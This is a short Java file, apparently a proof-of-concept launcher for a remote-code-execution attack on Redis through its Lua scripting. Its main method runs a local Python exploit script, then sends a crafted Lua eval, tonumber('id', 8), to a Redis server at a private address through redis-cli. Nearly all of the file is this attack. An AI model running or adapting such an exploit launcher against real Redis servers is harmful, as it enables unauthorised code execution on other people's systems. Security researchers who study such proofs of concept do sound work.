package cn.b1ue.redis.lua;

import java.io.IOException;

/**
 * @author 浅蓝
 * @email blue@ixsec.org
 * @since 2020/4/8 21:45
 */
public class LuaRCE {

    public static void main(String[] args) throws IOException {

        Runtime.getRuntime().exec("python redis_lua.py");

        Runtime.getRuntime().exec("redis-cli.exe -h 192.168.91.137 -x eval \"tonumber('id', 8)\" 0\n");

    }

}
